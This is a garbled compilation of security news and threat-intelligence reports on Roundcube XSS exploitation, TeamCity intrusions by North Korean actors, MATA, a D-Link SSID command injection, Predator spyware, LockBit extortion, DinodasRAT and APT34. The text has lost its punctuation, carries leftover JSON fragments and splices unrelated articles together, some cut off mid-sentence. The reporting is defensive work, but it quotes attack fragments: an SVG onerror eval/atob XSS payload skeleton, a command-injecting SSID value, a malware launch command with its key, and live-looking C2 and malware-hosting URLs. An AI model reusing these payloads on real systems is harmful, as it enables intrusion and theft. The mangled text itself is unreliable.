updating Roundcube Webmail to the latest available version as soon as possible25 Oct 2023 5 min readAccording to ESET telemetry data the campaign targeted Roundcube Webmail servers belonging to governmental entities and a think tank all in EuropeWe would like to thank the Roundcube developers for their quick reply and for patching the vulnerability in such a short time frameAt first sight the email doesnt seem malicious but if we examine the HTML source code shown inFigure 2 we can see an SVG tag at the end which contains a base64-encoded payloadOnce we decode the base64-encoded value in the href attribute of the use tag we havesvg idx xmlnshttpwwww3org2000svg image hrefx onerrorevalatob'base64-encoded payload' svgAs the x value argument of the href attribute is not a valid URL

specially crafted email message attackers are able to load arbitrary JavaScript code in the context of the Roundcube users browser window No manual interaction other than viewing the message in a web browser is requiredThe second stage is a simple JavaScript loader named checkupdatejs and is shown in Figure 3The final JavaScript payload shown in Figure 4 is able to list folders and emails in the

used to execute Plink in order to open port-forwarding on the compromised host allowing for remote RDP accessOn August 7 and again on August 12 Plink was downloaded from the internet on to the Domain Controller Computer 4 and saved as ProgramDataAdobeexeOn August 30 the attackers obtained access to a second web server Web Server 2 They first used Plink to enable access to RDP on Port 12345 from their CC server 911329290 They then installed InfostealerClipog using a different file name fs-toolexeThe next day August 31 the attackers established a tunnel once again to open RDP access on Port 4455 from their CC Output was redirected to a text file file name 001txt There may have been some issues connecting as the attackers later attempted to create the same tunnel this time using Port

vulnerability affecting multiple versions of JetBrains TeamCity server TeamCity is a continuous integrationcontinuous deployment CICD application used by organizations for DevOps and other software development activitiesWhile the two threat actors are exploiting the same vulnerability Microsoft observed Diamond Sleet and Onyx Sleet utilizing unique sets of tools and techniques following successful exploitationBased on the profile of victim organizations affected by these intrusions Microsoft assesses that the threat actors may be opportunistically compromising vulnerable servers However both actors have deployed malware and tools and utilized techniques that may enable persistent access to victim environmentsAs with any observed nation-state actor activity Microsoft directly notifies customers that have been targeted or compromised and provides them with the information they need to secure their environmentsOnyx Sleet PLUTONIUM is a North Korean nation-state threat actor that primarily targets defense and IT services organizations in South Korea the United States and India Onyx Sleet employs a robust set of tools that they have developed to establish persistent access to victim environments and remain undetected The actor frequently exploits N-day vulnerabilities as a means of gaining initial access to targeted organizationsFollowing the successful compromise of TeamCity servers Diamond Sleet utilizes PowerShell to download two payloads from legitimate infrastructure previously compromised by the threat actor These two payloads Forest64exe and 4800-84DC-063A6A41C5C are stored in the CProgramData directoryWhen launched Forest64exe checks for the presence of the file named 4800-84DC-063A6A41C5C then reads and decrypts the contents of that file using embedded statically assigned key of uTYNkfKxHiZrx3KJcProgramDataForest64exe uTYNkfKxHiZrx3KJThe decrypted content of 4800-84DC-063A6A41C5C is the configuration file for the malware which contains additional parameters such as the infrastructure used by the backdoor for command and control C2 Microsoft observed Diamond Sleet using infrastructure previously compromised by the actor for C2Microsoft observed Forest64exe then creating a scheduled task named Windows TeamCity Settings User Interface so it runs every time the system starts with the above referenced command parameter uTYNkfKxHiZrx3KJ Microsoft also observed Diamond Sleet leveraging the ForestTiger backdoor to dump credentials via the LSASS memory Microsoft Defender Antivirus detects this malware as ForestTigerDiamond Sleet leverages PowerShell on compromised servers to download a malicious DLL from attacker infrastructure This malicious DLL is then staged in CProgramData alongside a legitimate exe file to carry out DLL search-order hijacking Microsoft has observed these malicious DLL and legitimate EXE combinations used by the actorDSROLEdll attack chainWhen DSROLEdll is loaded by wsmprovhostexe the DLL initiates a thread that enumerates and attempts to process files that exist in the same executing directory as the DLL The first four bytes of candidate files are read and signify the size of the remaining buffer to read Once the remaining data is read back the bytes are reversed to reveal an executable payload that is staged in memory The expected PE file should be a DLL with the specific export named StartAction The address of this export is resolved and then launched in memoryWhile the functionality of DSROLEdll is ultimately decided by whatever payloads it deobfuscates and launches Microsoft has observed the DLL being used to launch wksprtexe which communicates with C2 domains Microsoft Defender Antivirus detects DSROLEdll using the family name RollSlingVersiondll attack chainWhen loaded by clipexe Versiondll loads and decrypts the contents of readmemd a file downloaded alongside Versiondll from attacker-compromised infrastructure The file readmemd contains data that is used as a multibyte XOR key to decrypt position-independent code PIC embedded in Versiondll This PIC loads and launches the final-stage remote access trojan RATOnce

successful compromise Microsoft observed Diamond Sleet dumping credentials via the LSASS memoryIn some cases Microsoft observed Diamond Sleet intrusions that utilized tools and techniques from both paths 1 and 2Following successful exploitation using the TeamCity exploit Onyx Sleet creates a new user account on compromised systems This account named krtbgt is likely intended to impersonate the legitimate Windows account name KRBTGT the Kerberos Ticket Granting Ticket After creating the account the threat actor adds it to the Local Administrators Group through net useThe threat actor also runs several system discovery commands on compromised systems includingNext the threat actor deploys a unique payload to compromised systems by downloading it from attacker-controlled infrastructure via PowerShell Microsoft observed these file paths for the unique payloadThis payload when launched loads and decrypts an embedded PE resource This decrypted payload is then loaded into memory and launched directly The inner payload is a proxy tool that helps establish a persistent connection between the compromised host and attacker-controlled infrastructure Microsoft Defender Antivirus

        "text": "Solutions forThreatsCategories18 Oct 2023 minute readTable of ContentsAuthorsIn early September 2022 we discovered several new malware samples belonging to the MATA cluster As we were collecting and analyzing the relevant telemetry data we realized the campaign had been launched in mid-August 2022 and targeted over a dozen corporations in Eastern Europe from the oil and gas sector and defense industryThe actors behind the attack used spear-phishing mails to target several victims some were infected with Windows executable malware by downloading files through an internet browser Each phishing document contains an external link to fetch a remote page containing a CVE-2021-26411 exploit The attackers continued to send malicious documents via email until the end of September 2022 Overall the campaign remained active over 6 months until May 2023After analyzing the timeline and functionality of each malware we have determined the infection chain of the campaign although some parts remain unknown due to limited visibility The attacker employed a combination of loader main trojan and stealer infection chains similar to those used by the previous MATA cluster and updated each malwares capabilities Moreover they introduced a process to validate compromised victims to ensure careful malware deliveryThe new MATA infection chainA turning point in the investigation was the discovery of two MATA samples that had internal IP addresses set as CC server addresses Attackers often create a chain of proxy servers within a corporate network to communicate between the malware and CC for example if the infected system does not have direct access to the internet Of course we have seen this before but in this case the malware configuration included IP addresses from a subnet we were unfamiliar with at the time and it caught our attention We immediately notified the affected organization of the likely compromise of systems with these IP addresses and received a swift response Starting to investigate this case we realized that the compromised systems were financial software servers and that these servers were having network access to several dozen subsidiaries of the targeted organization At that point we realized the compromise of one plants domain controller was just the tip of the iceberg As we continued our investigation we found that the attackers started the attack from the factory using a phishing email and progressed through the network until they discovered the shortcut of an RDP connection to the parent companys terminal server Then they acquired the users credentials and connected to the terminal server After that attackers repeated everything they had done at the attacked plant but this time on the scale of the entire parent company Using a vulnerability in a legitimate driver and a rootkit they interfered with the antivirus intercepted user credentials many of which were cached on the terminal server including accounts with administrator privileges on many systems and began actively moving around the networkNaturally this led to the parent companys domain controller being compromised and control being gained over even more workstations and servers But the attackers did not stop there Next they were able to access the control panels of two security solutions simultaneously First they got control over a solution for checking the compliance of systems with information security requirements by exploiting one of its vulnerabilities Second with the help of this security solution they managed to get access to the control panel of the endpoint protection solution that had not been securely configuredIn both cases security solutions were used by attackers to gather information about the targeted organizations infrastructure and to distribute malware as both systems have the capability to deploy and execute files remotely As a result taking over centralized systems for managing security solutions allowed the attackers to spread the malware to multiple subsidiaries at once as well as infect servers running Unix-like systems that they couldnt access even after gaining full

        "text": "The popular D-Link DAP-X1860 WiFi 6 range extender is susceptible to a vulnerability allowing DoS denial of service attacks and remote command injectionThe product is currently listed as available on D-Link's site and has thousands of reviews on Amazon so it's a popular choice among consumersA team of German researchers RedTeam who discovered the vulnerability tracked as CVE-2023-45208 report that despite their attempts to alert D-Link multiple times the vendor has remained silent and no fixes have been releasedThe problem lies in the network scanning functionality of D-Link DAP-X1860 specifically the inability to parse SSIDs containing a single tick ' in the name misinterpreting it as a command terminatorTechnically the problem originates from the 'parsingxmlstasurvey' function in the libcgifuncso library which contains a system command for executionHowever given the product's lack of SSID sanitization an attacker can easily abuse this feature for malicious purposesAn attacker within the extender's range can set up a WiFi network and deceptively name it similar to something the target is familiar with but include a tick in the name like 'Olaf's Network' for exampleWhen the device attempts to connect to that SSID it will produce an Error 500 Internal Server Error failing to operate normallyIf the attacker adds a second section to the SSID that contains a shell command separated by like Test' uname -a the extender will be tricked to execute the 'uname -a' command upon setupnetwork scanAll processes on the extender including any commands injected by external threat actors are run with root privileges potentially allowing the attackers to probe other devices connected to the extender and further their network infiltrationSeveral readily available software tools can generate and send deauth packets to the extender causing it to disconnect from its main network and forcing the target to perform a network scanThis means that D-Link DAP-X1860 is still vulnerable to attacks and the relatively simple exploitation mechanism makes the situation riskyOwners of DAP-X1860 extenders are recommended to limit manual network scans treat sudden disconnections suspiciously and turn off the extender when not actively usedAlso consider placing IoT devices and range extenders on a separate network isolated from sensitive devices holding personal or work data"

        "title": "Operation Behind Predator Mobile Spyware Is 'Industrial Scale'",
        "text": "The recent surge in Predator spyware is the result of a widespread and entrenched grey-area commercial operation that trades surveillance operations at industrial scaleThat's according to ananalysis by Amnesty International's Security Labs of data gathered by the European Investigative Collaboration EIC media network which has unearthed new information on how the actors behind the shadowy Predator mobile surveillance tool deliver it to target Android and iOS devicesIntellexa alliance's products have been found in at least 25 countries across Europe Asia the Middle East and Africa and have been used to undermine human rights press freedom and social movements across the globe Amnesty International said The 'Predator Files' investigation shows what we have long feared that highly invasive surveillance products are being traded on a near industrial scale and are free to operate in the shadows without oversight or any genuine accountabilityThe Amnesty International report highlights five technologies and lists several others that Intellexa has used over the years to help its government and law enforcement clients silently install Predator on mobile devices belonging to persons of interestOn top of the list is Mars a network injection system installed at mobile ISP locations The technology allows Intellexa customers to quietly redirect target users to a Pegasus infection server when they browse any HTTP Web page For the technology to work mobile ISPs need to install Mars on their network assign a static IP to the target subscriber and set up rules for forwarding traffic from the target IP address to the Mars system The network injection system can respond to the original HTTP request with a HTTP redirect containing a 1-click browser exploit link which infects the device without further user action the report notedIntellexa offers an add-on product to Mars called Jupiter that its customers can use to do similar network injection into encrypted HTTPS traffic In this case however the injection only works with websites hosted in the target user's country As with the Mars product customers have to convince mobile ISPs to install Jupiter hardware on their networks The technology basically enables Intellexa customers to insert themselves in the middle of HTTPS requests sent from the target user to a local HTTPS website and inject PredatorAnother tool that Amnesty highlighted in its report is Triton a product that Intellexa has positioned as something that customers can use to infect Samsung devices including the latest models running the most recent versions of Android The system appears to target vulnerabilities in baseband software used in Samsung devices which allows infection with the Predator spyware with 'no interaction with the target' or the need for the target to use a browser or any other app The Triton attack chain involves the malware first using a so-called IMSI catcher to downgrade Samsung devices from 5G 4G and 3G to the old 2G protocol Once that happens Triton uses what appears to be an integrated software defined base station to deliver the payload the Amnesty report notedThe other Intellexa tools that the Amnesty report highlights include SpearHead a range of Wi-Fi interception and infection products that operators can carry James-Bond-like on a briefcase in a surveillance van on a drone The technology from Intellexa alliance partner WiSpear allows for target identification geolocation monitoring traffic interception and payload delivery Other tools include a 3G4G GSM interception and infection product called Alpha-Max from Nexa group and Jasmine a product for deanonymizing encrypted WhatsApp and Signal traffic using metadata analysisIntellexa has often bundled these technologies to offer an end-to-end surveillance capability for governments and law-enforcement agencies An Intellexa price proposal that EIC investigators obtained showed the company offering a full range of remote data extraction services from Android and iOS devices for 8 million Euros The price includes one-click exploits for delivering Predator on Android and iOS devices the ability to monitor up to 10 targets concurrently analysis of all data extracted from target systems and a 12-month warrantyMicrosoft which released a 128-page digital defense report this week has one section on the emerging threat to organizations posed by cyber mercenary groups of which Intellexa would be one The company describes them as private sector offensive actorsCyber mercenaries as they're called sometimes in the policy world dot the landscape says Sherrod DeGrippo director of threat intelligence strategy at Microsoft I think it's something that we're going to have to continue watching because these are the entities that supply nation states with their technical capabilities to carry out destructive actionsDeGrippo perceives the sector as a bit of a gray area that is only going to continue to evolve and grow because of the potential for significant financial gain We have to commit to making sure that we are thinking about this threat tracking this as a threat making sure that we protect our customers and individuals from these kinds of threats and being in some ways threat landscape agnosticCopyright 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with

        "text": "CDW one of the largest resellers on the planet will have its data leaked by LockBit after negotiations over the ransom fee broke down a spokesperson for the cybercrime gang saysSpeaking to The Register the spokesperson who uses the alias LockBitSupp implied that during negotiations CDW offered a sum that was so low it insulted the crooksWe published them because in the negotiation process a 20 billion company refuses to pay adequate money the source saidAs soon as the timer runs out you will be able to see all the information the negotiations are over and are no longer in progress We have refused the ridiculous amount offeredLockBit did not respond to questions relating to what its original ransom demand was or what CDW offered in the negotiations It also shirked questions concerning the nature of the data stolen and what methods it used to breach the companyAccording to the countdown timer on LockBit's victim blog CDW's files are scheduled to be published in the early hours of the morning on October 11CDW has yet to comment on the incident which appears to have been ongoing since at least September 3 when the company was first posted to LockBit's blogThe Register has contacted CDW for clarity but the company has not offered a responseIts automatic email reply reads Thank you for contacting CDW Your inquiry has been received and will be reviewed Should there be a fit or an interest in engaging further we will be in touch as soon as possibleThe UK Information Commissioner's Office ICO confirmed that it had not received a breach report from CDWCybersecurity analyst and researcher Dominic Alvieri said the company was technically posted to LockBit's blog three times in total It was originally flashed a tactic involving the quick posting and deletion of a company to encourage a fast response from the victimWhen deadlines come and go it is a sign the company is negotiating or has at least acknowledged the incident he saidThe repost is usually the final stages The ransoms process can take weeksmonthsPosting a company to a victim blog multiple times isn't something that happens in every case but it is a known aggressive tactic adopted by ransomware groups to hurry negotiations experts told The RegisterRansomware groups are ramping up their tactics in forcing victims to pay quickly and this is all part of their business model to extort more money in a timely fashion from their targets said Jake Moore global cybersecurity advisor at ESETThere is always a chance however that this is a tactic used to force their victims' hands to act quickly yet no real substance be in the original claimThis is the common gamble played between cybercriminals and their victims where one wrong move and a poker face could cost companies huge amounts in ransom payments and more problems thereafter from leaked data in public viewThe deadline was set for February 13 and no data was published A day later instead of making Royal Mail International's stolen data public LockBit posted the full negotiation history between it and the company in the form of a downloadable chat logThe chat logs revealed the ransom demand was originally set at 80 million later offering a 50 percent discount after the company branded the demands absurdAt the time the release of the chat logs was seen as an example of these scare tactics After Royal Mail's continued refusal to pay LockBit eventually staggered the publication of its data much of which included employee information in 10 separate dumpsIn the Royal Mail negotiations the transcript shows the negotiator attempting to convince LockBit to hand over two files as proof the criminals' decryptor workedLockBit realized after a few days that the two files would have allowed Royal Mail to fully recover its systems without paying for the decryptorTowards the end of the negotiations where Royal Mail appeared to stall LockBit for as long as it could by saying it was waiting for its board to decide on whether to pay the discounted ransom fee LockBit grew frustrated with the tactics and published the data after days on non-responsiveness from Royal MailOver the years LockBit has been accused of orchestrating various PR stunts to cause confusion and raise its notoriety levelThese have included fake ransomware attacks on large organizations posting their details to LockBit's website along with a countdown timer to indicate the publication date of the stolen files just as it does with genuine victimsOne such example came in June 2022 when it claimed to have breached incident response specialists Mandiant In typical fashion the countdown timer spent days reaching zero and what was published wasn't the data it claimed to have stolen from the company but instead a response to claims that the group was linked to the sanctioned cybercrime outfit Evil CorpPaying ransoms to these cyber threat groups is still not illegal in most countries however a formalized association with Evil Corp would render those payments potentially out of the law with significant civil and criminal implications for the organizations involved in themGiven that LockBit is one of the most prolific ransomware groups in activity at the moment it is likely that they intend to continue their highly successful and profitable ransomware operations for the following monthsLockBit repeated the same trick later that year this time against French multinational IT company Thales Although in Thales's case it was only half fibbingAt the time Thales's public statements repeatedly denied evidence of an IT intrusion but on November 10 2022 three days after LockBit promised to publish its data Thales confirmed that data had been stolen and publishedHowever it said the theft was carried out by two likely sources one of which was confirmed through the user account of a partner on a dedicated collaboration portal and the other was unknown The Register Biting the hand

        "text": "Award-winning news views and insight from the ESET security community Award-winning news views and insight from the ESET security community ESET ResearchESET researchers discovered a cyberespionage campaign against a governmental entity in Guyana05 Oct 2023 15 min readIn February 2023 ESET researchers detected a spearphishing campaign targeting a governmental entity in Guyana While we havent been able to link the campaign which we named Operation Jacana to any specific APT group we believe with medium confidence that a China-aligned threat group is behind this incidentIn the attack the operators used a previously undocumented C backdoor that can exfiltrate files manipulate Windows registry keys execute CMD commands and more We named the backdoor DinodasRAT based on the victim identifier it sends to its CC the string always begins with Din which reminded us of the hobbit Dinodas from the Lord of the RingsKey points of this blogpostThis campaign was targeted as the threat actors crafted their emails specifically to entice their chosen victim organization After successfully compromising the first couple of machines with DinodasRAT the operators proceeded to move laterally and breach the targets internal network where they again deployed the DinodasRAT backdoor along with additional malicious tools among them a variant of Korplug aka PlugX The overview of the compromise flow in Operation Jacana is shown in Figure 1While our attribution to a China-aligned threat actor is made with only medium confidence the hypothesis is further supported by recent developments in GuyanaChina diplomatic relations In February 2023 the same month that Operation Jacana occurred the Special Organised Crime Unit SOCU of Guyana arrested three people in a money laundering investigation involving Chinese companies an act disputed by the local Chinese embassy Additionally as part of the Belt and Road Initiative China has economic interests in GuyanaAs the first step in breaching their victims network the threat actors behind Operation Jacana sent the target organization spearphishing emails referencing Guyanese public affairs We observed the following subject linesThe spearphishing emails contained a link that when clicked downloaded a ZIP file from httpsftamoitgovvnfilepeoplezip Since a domain ending with govvn indicates a Vietnamese governmental website we believe that the operators were able to compromise another governmental entity and use it to host their malware samples We have notified the VNCERT about the compromised infrastructureOnce the victim extracted the ZIP file which wasnt password protected and launched the contained executable they became compromised with the DinodasRAT malware The extracted filenames are related to the phishing email subject linesSome of the commands the attackers executed on the network includeDinodasRAT is a previously undocumented remote access trojan developed in C with various capabilities that allow an attacker to spy on and collect sensitive information from a victims computerWhen executed the malware first checks whether three arguments were passed If present these arguments must contain the following information in the following orderIf all three arguments were passed DinodasRAT terminates the process represented by the process ID using the Windows API TerminateProcess then uses the Windows API DeleteFileW to delete the file passed in the third argument After this the process stops its execution by using the C standard library exit function This is most likely intended as an uninstall functionThe Application Doc directory is created with the attributes Read-only and Hidden Inside of Application Doc DinodasRAT creates two subdirectories named 0 and 1 Once the directory exists the malware spawns three threads used for data collection and exfiltration A detailed description of their behavior is given in Table 1Table 1 Thread descriptionsThreadDescription1Take a screenshot of the display of the victims machine every five minutes using Windows API functions like CreateDCW BitBlt DeleteDC or ReleaseDC The screenshot is compressed and saved in the subdirectory Application Doc0In order to compress the screenshot the attackers use the zlib library version 1211The format of the filename used for the saved screenshots is the following YYYYMMDDHHMMSSfive random

used for the clipboard data file is the followingDateTimeStampfive random digitsone random digittxt3Loops through the subdirectories 0 and 1 and sends the filenames encrypted with TEA and base64 encoded to the CC server If the CC server replies it creates another packet in order to send the filename with its data Finally it deletes the file from the victims machineTake a screenshot of the display of the victims machine every five minutes using Windows API functions like CreateDCW BitBlt DeleteDC or ReleaseDC The screenshot is compressed and saved in the subdirectory Application Doc0In

ID used to identify the victim to the CC serverFigure 2 shows an example of the ID saved in the confini fileThe format of the ID is DinYYYYMMDDMD5-HASHRANDOM-VALUEV1 whereWe found that the malware contains three different keys used for different encryptiondecryption scenarios as described in Table 2Table 2TEA keys used by DinodasRATKeyNValueDescription1A1 A1 18 AA 10 F0 FA 16 06 71 B3 08 AA AF

they are sent to the CC server311 0A A8 E1 C0 F0 FB 10 06 71 F3 18 AC A0 6A AFUsed to decrypt the installation pathsIn order to communicate with the CC server DinodasRAT uses the Winsock library to create a socket that uses the TCP protocol Although TCP is the default protocol used to send and receive information from the CC server we have seen that DinodasRAT is capable of changing to the UDP protocolThe backdoor also creates various threads for different purposes such as manipulating a received command to execute on the victims machine Hence in order to maintain synchronized communication DinodasRAT makes use of Windows event objects by using Windows API functions like CreateEventW SetEventW and WaitForSingleObjectTo start the main communication with the CC server DinodasRAT sends a packet with basic information about the victims machine and its configuration such asFigure 3 shows not only basic information collected about the victim but also the ID generated by the malware which serves as a victim identifier for the CC serverAll the information that DinodasRAT sends to the CC server via the TCP protocol is TEA encrypted In addition to that some of the information is also base64 encodedTo send the stolen information to the CC server DinodasRAT crafts a packet containing the followingFigure 4 shows an example of an encrypted packet to be sent to the CC serverDuring our analysis we were unable to obtain a response from the CC server but we were able to determine that any packets received from the server should also be encrypted with TEAWhen it comes to handling commands received from the CC server DinodasRAT creates a thread with an infinite loop responsible for receiving and determining whether packets contain encrypted commands to executeA packet once decrypted contains the following structureDinodasRAT contains commands capable of performing various actions on a victims machine or on the malware itself Table 3 lists the supported commands with a

persistent threat APT APT34 group with a new malware variant accompanying a phishing attack comparatively similar to the SideTwist backdoor malware Following the campaign the group abused a fake license registration form of an African government agency to target a victim in Saudi ArabiaBy Mohamed Fahmy Mahmoud ZohdySeptember 29 2023Read time wordsSave to FolioDuring our investigation there was little information about the victims targeted by this malware But the file that APT34 used for this attack is called MyCvdoc a license registration form related to the Seychelles Licensing Authority However we noted that the document contained pricing information in Saudi Riyal which might indicate that the targeted victim was an organization inside the Kingdom of Saudi Arabia This blog post provides an analysis of the groups latest malware and its capabilities shows the attack process and details the attackers infrastructureAPT34 background and targetingInfection routineThe infection starts with a malicious document dropping a hardcoded malware and creates a scheduled task for persistence once the targeted victim opens the document The malicious document contains hidden macros responsible for dropping a NET malware into the ALLUSERSPROFILEOffice356 directory naming it Menorahexe It then creates a scheduled task named OneDriveStandaloneUpdater to execute the Menorahexe malware The image in Figure 2 shows a portion of the macros' functions responsible for string transformation decoding and the creation of the scheduled taskMalware analysisThe NET-written malware delivered through the malicious document is primarily deployed for cyberespionage and possesses multifaceted capabilities The malware can fingerprint the targeted machine list directories and files upload selected files from the compromised system execute shell commends and download files to the systemCompared to the previous variant of SideTwist the new variant has more functions to hash the traffic to the command and control CC server and make it stealthier to avoid detection Initially the malware conducts a specific argument check during execution to ensure the correct flow of its operations In the absence of the specified argument the malware will terminate and stop its execution The regular check ensures the routines and components stealth and detects if the malware is in an analytic environment like a sandbox If the argument determines that its running inside a sandbox the malware will run without the argument and terminate itselfWe identified the CC server httptecforsc-001-site1gtempurlcomadsasp as a string subsequently used for HTTP communication and to create a timer to repeat a specific code every 32000 milliseconds or every 32 seconds as a way to organize communication with the CC serverThen the malware fingerprints the machine by getting the machine name and username in this format MachineNameUsername The malware continues to encode the string into ASCII then calculates for the MD5 hash from it The MD5 hash is combined with the MachineNameUsername in the format dMD5 hashMachineNameUsername XOR with a hardcoded string and encoded in Base64 creating a fingerprint for the compromised system This fingerprint is sent to the CC server as the content of an HTTP request as shown in the figure belowUnfortunately the CC server was inactive at the time of analysis However from the analysis for functions responsible for parsing the CC we expected that the response returned will be an encrypted massage and further encoded in Base64 The decrypted and decoded message split into an array and each value inside it represents part of the message received from the CC server Based on these values the malware will have specific actions on the machineFrom static analysis we observed the malware capable of executing a command received from the CC server list directory and files on the compromised system and upload specific files to server and download files The following are the malwares commands values and actionsSimilarities to backdoor SideTwistConclusionsThe similarities to the SideTwist backdoor suggests that APT34 is in continuous-development mode changing up and trying which routines and techniques will work Typical of APT groups APT34 demonstrates their vast resources and varied skills and will likely persist in customizing routines and social engineering techniques to use per targeted organization to ensure success in intrusions stealth and cyber espionage The earlier variant of SideTwist is written in C and this latest variant has a very similar set of functions but in a NET implementationIndicators of Compromise IOCsURLhxxptecforsc-001-site1gtempurlcomadsaspMohamed FahmyThreat ResearcherMahmoud
